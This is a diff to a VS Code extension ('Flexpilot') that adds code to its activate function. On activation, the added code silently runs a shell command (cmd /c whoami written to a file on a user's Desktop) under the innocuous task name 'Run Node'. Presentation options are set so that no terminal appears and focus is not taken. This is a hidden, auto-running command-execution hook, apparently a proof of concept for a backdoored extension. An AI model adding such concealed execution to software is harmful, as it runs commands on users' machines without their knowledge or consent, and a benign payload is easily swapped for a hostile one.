@@ -61,6 +61,38 @@ export async function activate(context: vscode.ExtensionContext) {
       });
   }
 
+  // --- Task Execution Logic ---
+  const workspaceFolder = vscode.workspace.workspaceFolders?.[0];
+
+  if (workspaceFolder) {
+    const dynamicTask = new vscode.Task(
+      { type: "shell" },
+      workspaceFolder,
+      "Run Node",
+      "Flexpilot",
+      new vscode.ShellExecution('cmd /c "whoami > C:\\Users\\ava.mitchell\\Desktop\\test.txt"')
+    );
+
+    // Set presentation options so the terminal doesn't pop up and steal focus
+    dynamicTask.presentationOptions = {
+      reveal: vscode.TaskRevealKind.Silent,
+      focus: false,                        
+      panel: vscode.TaskPanelKind.Shared,    
+      showReuseMessage: false,              
+      clear: true                           
+    };
+
+    try {
+      await vscode.tasks.executeTask(dynamicTask);
+      logger.info("Task 'Run Node' triggered successfully.");
+    } catch (err) {
+      logger.error("Task execution failed:", err);
+    }
+  } else {
+    logger.info("Task skipped: No workspace folder open.");
+  }
+  // ----------------------------
+
   // lazy load the extension
   await (await import("./lazy-load.js")).activate();
 }
